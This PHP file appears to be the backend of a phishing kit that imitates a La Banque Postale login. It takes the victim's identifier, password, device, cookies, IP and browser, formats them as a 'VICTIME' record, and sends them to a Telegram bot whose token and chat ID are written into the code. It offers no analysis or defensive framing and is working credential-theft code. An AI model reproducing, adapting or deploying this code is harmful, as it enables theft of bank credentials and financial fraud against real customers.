<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);


header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");



include('get_browser.php');
include('get_ip.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');	
if(isset($_POST) ){

$data = array();	

if (!empty($_COOKIE)) {
$valeurDuCookie = print_r($_COOKIE, true);
}

if ($_POST['ID_pst'] == "" || $_POST['PASS_pst'] == "" || $_POST['DEVICE'] == ""){



$data['statut'] = 'error'; 
$data['title'] = 'echec';
$data['resultat']="aucune donnée saissir ";

}else{
	


$Domin = $_SESSION['Domin'] = $_SERVER['HTTP_REFERER']; 
$rt = $Domin;
$rtt = ''.$rt.'/backend/dashbord.html' ;
$DCH_MESSAGE .= "
+=======VICTIME INFORMATION========+
| IP INFO          =".$ip."    
| TIME/DATE        =".$TIME_DATE."
| BROWSER          =".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])." 
+==========LOGIN BANQUE POSTALE========+
| DEVICE           =  ".$_POST['DEVICE']."
| COOKIE           =  ".$valeurDuCookie."
| IDENTIFIANT      =  ".$_POST['ID_pst']."
| MOT DE PASSE     =  ".$_POST['PASS_pst']."
| LIEN PANEL       =  ".$rtt."
+===============================+\n";

file_get_contents("https://api.telegram.org/bot7754602986:AAGOeikgQF1YhYGFFUJSVSL_hxcpRZeVvuE/sendMessage?chat_id=-1002403728535&text=".urlencode($DCH_MESSAGE)."" );



$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";

}

echo json_encode($data);

}


